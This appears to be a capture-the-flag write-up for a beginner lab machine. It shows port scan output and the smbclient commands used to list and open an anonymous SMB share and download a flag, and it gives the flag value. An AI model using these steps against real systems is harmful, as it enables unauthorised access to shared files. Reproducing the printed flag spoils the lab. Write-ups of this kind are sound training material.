# Dancing — Tier 0

**Concept:** SMB enumeration and anonymous share access to retrieve a flag.

## Recon

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## Exploitation

### Step 1 — Enumerate SMB Shares

Listed available SMB shares with null/anonymous session:

```
smbclient -L //10.129.x.x -N
```

### Step 2 — Connect to the Share

Connected to the discovered share:

```
smbclient //10.129.x.x/<share> -N
```

### Step 3 — Download Flag

```
smb: \> ls
smb: \> get flag.txt
smb: \> quit
```

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | SMB (port 445) |
| Attack Vector | Anonymous SMB share access |
| Flag | `5f61c10dffbc77a704d76016a22f1664` |
